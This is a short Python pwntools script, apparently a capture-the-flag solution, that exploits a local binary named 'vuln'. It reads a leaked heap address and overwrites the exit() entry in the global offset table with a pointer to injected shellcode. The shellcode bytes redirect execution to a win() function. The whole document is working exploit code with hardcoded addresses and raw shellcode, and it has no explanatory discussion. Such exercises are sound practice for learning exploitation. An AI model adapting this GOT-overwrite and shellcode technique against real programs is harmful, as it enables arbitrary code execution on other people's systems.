from pwn import *

p = process(["./vuln", "AAAABBBBCCCCDDDD"])

p.recvline()

# Get address
address = int(p.recvline())

# left + 0x8 = exit() entry in GOT
e = p32(0x0804d020)

# right = location in heap containing shellcode to call win()
# This is equal to the location given by address + 0x8
e += p32(address + 0x8)
print("Address: " + str(hex(address)))
print(hex(address+0x8))

# shellcode (push 0x08048966 ; ret)
e += "\x68\x66\x89\x04\x08\xc3"

p.sendline(e)
print(p.recvall())
